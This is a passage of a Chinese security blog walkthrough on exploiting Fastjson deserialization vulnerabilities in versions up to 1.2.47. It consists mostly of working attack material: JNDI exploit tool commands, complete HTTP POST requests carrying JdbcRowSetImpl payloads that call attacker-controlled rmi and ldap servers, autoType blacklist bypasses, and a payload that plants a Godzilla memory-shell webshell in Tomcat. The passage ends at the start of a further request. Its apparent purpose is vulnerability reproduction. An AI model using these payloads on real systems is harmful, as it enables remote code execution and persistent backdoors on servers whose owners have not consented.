+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/4.png"
+	width="1295"
+	height="712"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/4_hu_c459f7dbef077946.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/4_hu_39b5f9f06e4666e9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="181"
+		data-flex-basis="436px"
+	
+></p>
+<p><strong>使用JNDI-Injection-Exploit进行利用</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">JNDI</span><span class="o">-</span><span class="n">Injection</span><span class="o">-</span><span class="n">Exploit</span><span class="o">-</span><span class="n">1</span><span class="p">.</span><span class="na">0</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="n">all</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="s">&#34;calc.exe&#34;</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w"> </span><span class="s">&#34;192.168.165.252&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="n">要执行的命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="n">A本机地址或者Vps地址</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">json</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">252</span><span class="p">:</span><span class="n">8088</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba</span><span class="o">=</span><span class="n">1748439476</span><span class="p">;</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">23FC54A22F8400C422A60A4C492EE6C2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">162</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;b&#34;</span><span class="p">:{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;rmi://192.168.165.252:1099/ymbbhf&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>此时弹出计算器</strong></p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/5.png"
+	width="1965"
+	height="819"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/5_hu_e30defe8b6303cd3.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/5_hu_c3779497a674edd4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="575px"
+	
+></p>
+<p><strong>注意：此时测试通过的FastJson版本为1.2.23版本，JDK版本为11，当JDK版本大于11时，漏洞无法利用成功，当fastjson版本大于1.2.23时再次攻击就会报错，这个错误仍然是 Fastjson 的 autoType 安全机制阻止了com.sun.rowset.JdbcRowSetImpl的反序列化，即使你升级了 JDK 版本，Fastjson 仍然会阻止该类的反序列化，因为 JdbcRowSetImpl 存在安全风险（可用于 JNDI 注入攻击）。</strong></p>
+<h3 id=""><strong><font style="color:#000000;">打入内存马</font></strong>
+</h3><p><strong>内存马利用工具：</strong><a class="link" href="https://github.com/Pikaqi/JNDIExploit-1.4"  target="_blank" rel="noopener"
+    ><strong>https://github.com/Pikaqi/JNDIExploit-1.4</strong></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">JNDIExploit</span><span class="o">-</span><span class="n">1</span><span class="p">.</span><span class="na">4</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w">      </span><span class="c1">//查看使用方法</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/6.png"
+	width="1628"
+	height="873"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/6_hu_4a26676b9ff55352.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/6_hu_5b702b0b2aa0fc74.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">JNDIExploit</span><span class="o">-</span><span class="n">1</span><span class="p">.</span><span class="na">4</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="p">.</span><span class="na">jar</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">252</span><span class="w">  </span><span class="n">绑定IP地址启动</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">json</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">252</span><span class="p">:</span><span class="n">8088</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">png</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">svg</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">image</span><span class="cm">/*;q=0.8,*/</span><span class="o">*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//192.168.165.252:8088/login;jsessionid=269897CD3047E364E22D450F40715A64</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba</span><span class="o">=</span><span class="n">1748439476</span><span class="p">;</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">269897CD3047E364E22D450F40715A64</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">6</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">178</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;b&#34;</span><span class="p">:{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;ldap://0.0.0.0:1389/TomcatBypass/GodzillaMemshell&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>成功打入内存马</strong></p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/7.png"
+	width="1253"
+	height="938"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/7_hu_b755fe5b91ed62ac.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/7_hu_442edb88607041a5.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="133"
+		data-flex-basis="320px"
+	
+></p>
+<h3 id="52fastjson--1247反序列化远程命令执行漏洞">5.2.Fastjson &lt;= 1.2.47<strong>反序列化远程命令执行漏洞</strong>
+</h3><p><a class="link" href="https://mp.weixin.qq.com/s/J2ra-AXIxUJlSqum9xUeDA"  target="_blank" rel="noopener"
+    >Fastjson系列-漏洞复现</a></p>
+<p>第一个Fastjson反序列化漏洞爆出以后，阿里在1.2.25版本设置了<code>autoTypeSupport</code>属性默认为false，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的。</p>
+<p><code>com.sun.rowset.jdbcRowSetlmpl</code>在1.2.25版本被加入了黑名单，fastjson有个判断条件判断类名是否以&quot;L&quot;开头，以&quot;;&ldquo;结尾，是的话就提取出其中的类名在加载进来。</p>
+<p>那么就可以构造如下exp：</p>
+<p>总之就是对比上一个版本，增加了一些过滤，开启<code>autoType后，构造描述符绕过</code>，添加字符即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;Lcom.sun.rowset.JdbcRowSetImpl;&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="s">&#34;rmi://ip:9999/rce_1_2_24_exploit&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="kc">true</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">json</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">252</span><span class="p">:</span><span class="n">8088</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">;</span><span class="w"> </span><span class="n">rv</span><span class="p">:</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="p">)</span><span class="w"> </span><span class="n">Gecko</span><span class="o">/</span><span class="n">20100101</span><span class="w"> </span><span class="n">Firefox</span><span class="o">/</span><span class="n">138</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">8</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">TW</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">7</span><span class="p">,</span><span class="n">zh</span><span class="o">-</span><span class="n">HK</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">5</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">3</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba</span><span class="o">=</span><span class="n">1748439476</span><span class="p">;</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">FB191FA4A87502B1D47A0EF7BFEEDCB2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Priority</span><span class="p">:</span><span class="w"> </span><span class="n">u</span><span class="o">=</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">267</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;a&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.Class&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s">&#34;b&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;dataSourceName&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;ldap://192.168.165.252:1389/TomcatBypass/GodzillaMemshell&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;autoCommit&#34;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>命令执行，通过tomcat回显，fastjson不出网可以使用此方法</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">json</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
